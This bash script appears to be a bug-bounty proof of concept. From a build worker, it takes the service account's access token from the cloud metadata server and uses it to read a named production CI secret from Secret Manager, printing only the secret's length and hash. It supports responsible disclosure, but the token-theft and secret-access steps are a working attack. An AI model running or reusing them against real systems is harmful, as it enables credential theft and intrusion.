#!/bin/bash
# VRP 582019927 capability proof. Reads one production secret as the
# worker service account and prints only non-reversible proof:
# HTTP status, byte length, and SHA-256. The secret value is never
# written to the log, sent anywhere, or kept. No token is printed.
set -u

MD="http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default"
PROJECT="bazel-untrusted"
SECRET="bazel-buildkite-agent-token"

# 1. Identity (not sensitive).
EMAIL=$(curl -s --noproxy '*' --max-time 5 -H 'Metadata-Flavor: Google' "$MD/email")
SCOPES=$(curl -s --noproxy '*' --max-time 5 -H 'Metadata-Flavor: Google' "$MD/scopes" | tr '\n' ' ')
echo "VRP-582019927-MARKER service_account=$EMAIL"
echo "VRP-582019927-MARKER scopes=$SCOPES"

# 2. Get an access token into a variable. It is never printed.
TOKEN=$(curl -s --noproxy '*' --max-time 5 -H 'Metadata-Flavor: Google' "$MD/token" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)

# 3. Access the secret. Capture body and HTTP status separately.
URL="https://secretmanager.googleapis.com/v1/projects/$PROJECT/secrets/$SECRET/versions/latest:access"
RESP=$(curl -s --noproxy '*' --max-time 10 -w $'\n%{http_code}' \
  -H "Authorization: Bearer $TOKEN" "$URL")
CODE=$(printf '%s' "$RESP" | tail -n1)
echo "VRP-582019927-MARKER secretmanager_http_status=$CODE secret=$SECRET"

# 4. Hash the secret value without ever printing it. On any parse
#    problem we print a fixed string, never the response body.
printf '%s' "$RESP" | sed '$d' | python3 -c '
import sys, json, base64, hashlib
try:
    d = json.load(sys.stdin)
    raw = base64.b64decode(d["payload"]["data"])
    print("VRP-582019927-MARKER secret_bytes=%d secret_sha256=%s (value not logged)"
          % (len(raw), hashlib.sha256(raw).hexdigest()))
except Exception:
    print("VRP-582019927-MARKER secret_not_parsed")
' 2>/dev/null

exit 1
